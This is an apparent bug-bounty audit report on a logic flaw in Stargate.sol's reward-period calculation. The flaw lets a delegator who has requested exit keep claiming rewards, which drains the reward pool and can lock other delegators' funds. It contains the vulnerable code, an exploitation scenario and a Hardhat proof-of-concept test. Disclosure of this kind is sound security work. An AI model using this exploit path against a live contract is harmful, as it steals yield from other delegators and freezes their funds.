# 60028 sc high a delegator who has requested an exit continues to accumulate rewards

* Report ID: #60028
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* Impacts:
  * Theft of unclaimed yield
  * Temporary freezing of funds for at least 24 hour

## #60028 \[SC-High] A delegator who has requested an exit continues to accumulate rewards

Submitted on Nov 17th 2025 at 17:44:19 UTC by @shaflow1 for Audit Comp | Vechain | Stargate Hayabusa (<https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa>)

### Description

#### Brief/Intro

There is a logic flaw in the `_claimableDelegationPeriods` function, which allows a delegator to continue accumulating and claiming rewards even after calling `requestDelegationExit`, as long as they do not unstake. This can lead to delegation rewards being stolen and also cause inconsistencies in reward token distribution. When the reward tokens in the Stargate contract are insufficient to cover payouts for other delegators, their fund withdrawals can be DOS-ed.

#### Vulnerability Details

The `_claimableDelegationPeriods` function is used to return the start and end periods of claimable rewards, but it contains a logical flaw.

{% code title="Stargate.sol (excerpt)" %}

```solidity
    function _claimableDelegationPeriods(
        StargateStorage storage $,
        uint256 _tokenId
    ) private view returns (uint32, uint32) {
        // get the delegation
        uint256 delegationId = $.delegationIdByTokenId[_tokenId];
        // if the token does not have a delegation, return 0
        if (delegationId == 0) {
            return (0, 0);
        }
        (address validator, , , ) = $.protocolStakerContract.getDelegation(delegationId);
        if (validator == address(0)) {
            return (0, 0);
        }

        (uint32 startPeriod, uint32 endPeriod) = $
            .protocolStakerContract
            .getDelegationPeriodDetails(delegationId);
        (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
            validator
        );

        // current validator period is the next period because
        // the current period is the one that is not completed yet
        uint32 currentValidatorPeriod = completedPeriods + 1;

        // next claimable period is the last claimed period + 1
        uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
        // if the next claimable period is before the start period, set it to the start period
        if (nextClaimablePeriod < startPeriod) {
            nextClaimablePeriod = startPeriod;
        }

        // check first for delegations that ended
        // endPeriod is not max if the delegation is exited or requested to exit
        // if the endPeriod is before the current validator period, it means the delegation ended
        // because if its equal it means they requested to exit but the current period is not over yet
        if (
            endPeriod != type(uint32).max &&
            endPeriod < currentValidatorPeriod &&
 @>           endPeriod > nextClaimablePeriod
        ) {
            return (nextClaimablePeriod, endPeriod);
        }

        // check that the start period is before the current validator period
        // and if it is, return the start period and the current validator period.
        // we use "less than" because if we use "less than or equal", even
        // if the delegation started, the current period rewards are not claimable
        if (nextClaimablePeriod < currentValidatorPeriod) {
            return (nextClaimablePeriod, completedPeriods);
        }

        // the rest are either pending, non existing or are active but have no claimable periods
        return (0, 0);
    }
```

{% endcode %}

When an NFT calls `requestDelegationExit` to mark a delegation for exit, the `endPeriod` is set to the current period. In the next period, the delegator's funds will no longer participate in delegation and can be withdrawn. Therefore, in this case, the `_claimableDelegationPeriods` function should never return an end period for rewards that exceeds the `ExitPeriod` (`endPeriod`).

However, the check `endPeriod > nextClaimablePeriod` can cause the function to return the validator's `completedPeriods` as the end period even if the delegator has already exited in the following scenario:

{% stepper %}
{% step %}

### Scenario step

There are two delegators. `delegator1` calls `requestDelegationExit` at `currentPeriod = 5`, marking the exit, so `endPeriod = 5`.
{% endstep %}

{% step %}

### Scenario step

After 1 period, `currentPeriod = 6`. `delegator1` can now exit, and `delegatorsEffectiveStake` is reduced.
{% endstep %}

{% step %}

### Scenario step

`delegator1` calls `claimRewards` to claim rewards. At this point, `_claimableDelegationPeriods` returns the reward end period as `endPeriod = 5`, and after the call, `lastClaimedPeriod[_tokenId] = 5`.
{% endstep %}

{% step %}

### Scenario step

After another period, `currentPeriod = 7`, `delegator1` claims rewards again. Now, `nextClaimablePeriod = lastClaimedPeriod[_tokenId] + 1 = 6 > endPeriod = 5`. Therefore, `_claimableDelegationPeriods` does not enter the `if` branch returning `(nextClaimablePeriod, endPeriod)` and instead returns `(nextClaimablePeriod (6), completedPeriods (6))`. As a result, `delegator1` can continue to claim rewards for period 6.
{% endstep %}

{% step %}

### Scenario step

Subsequently, `delegator1` continues accumulating rewards each period. Because the denominator `delegatorsEffectiveStake` is reduced, the yield may even exceed normal delegation. Meanwhile, the rewards allocated by the node to the contract are insufficient, causing reward tokens to run out, and `delegator2` cannot claim rewards or unstake.
{% endstep %}
{% endstepper %}

#### Impact Details

The above issue allows malicious actors to claim excessive rewards, while the staking rewards allocated by the validator to Stargate remain unchanged. If there are many such attackers in the system, reward tokens can be stolen by them, and legitimate delegators may be unable to claim rewards or advance reward periods due to insufficient reward tokens, preventing them from unstaking and effectively locking their funds.

#### References

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L919>

### Proof of Concept

The following test demonstrates that after `requestDelegationExit`, rewards can still be claimed even after the `endPeriod` has passed. Add this test to the end of packages/contracts/test/unit/Stargate/Rewards.test.ts to reproduce.

{% code title="PoC (JavaScript / Hardhat test)" %}

```javascript
    it("should claim rewards after exit and have no further rewards after additional period", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId = await stargateNFTMock.getCurrentTokenId();
        log("\n🎉 Staked token with id:", tokenId);

        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId2 = await stargateNFTMock.getCurrentTokenId();
    
        // delegate
        tx = await stargateContract.connect(user).delegate(tokenId, validator.address);
        await tx.wait();
        log("\n🎉 Delegated token to validator", validator.address);

        tx = await stargateContract.connect(user).delegate(tokenId2, validator.address);
        await tx.wait();
        log("\n🎉 Delegated token to validator", validator.address);
    
        // fast forward initial completed periods for reward accumulation
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5);
        await tx.wait();
        log("\n🎉 Set validator completed periods to 5");
    
        // request exit
        tx = await stargateContract.connect(user).requestDelegationExit(tokenId);
        await tx.wait();
        log("\n🎉 Requested delegation exit");
    
        // fast forward two more periods after exit
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 7);
        await tx.wait();
        log("\n🎉 Set validator completed periods to 7 (2 periods after exit)");
    
        // claim rewards
        const claimableBefore = await stargateContract["claimableRewards(uint256)"](tokenId);
        expect(claimableBefore).to.be.greaterThan(0n);
    
        const preClaimBalance = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(tokenId);
        await tx.wait();
        log("\n💰 Claimed rewards");
    
        const postClaimBalance = await vthoTokenContract.balanceOf(user.address);
        expect(postClaimBalance).to.equal(preClaimBalance + claimableBefore);
        console.log(postClaimBalance);
        
        // fast forward one more period
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 8);
        await tx.wait();
        log("\n🎉 Set validator completed periods to 8 (1 more period)");
        let delegateId = await stargateContract.getDelegationIdOfToken(tokenId);
        let [, endPeriod] = await protocolStakerMock.getDelegationPeriodDetails(delegateId);
        console.log(endPeriod);
    
        // claimable rewards should now be 0
        const claimableAfter = await stargateContract["claimableRewards(uint256)"](tokenId);
        log("\n💰 Claimable rewards after extra period:", claimableAfter);
        expect(claimableAfter).not.to.equal(0n);
        const preClaimBalance2 = await vthoTokenContract.balanceOf(user.address);
        tx = await stargateContract.connect(user).claimRewards(tokenId);
        await tx.wait();
        log("\n💰 Claimed rewards");
    
        const postClaimBalance2 = await vthoTokenContract.balanceOf(user.address);
        expect(postClaimBalance2).to.equal(preClaimBalance2 + claimableAfter);
        console.log(postClaimBalance2);
    });
```

{% endcode %}
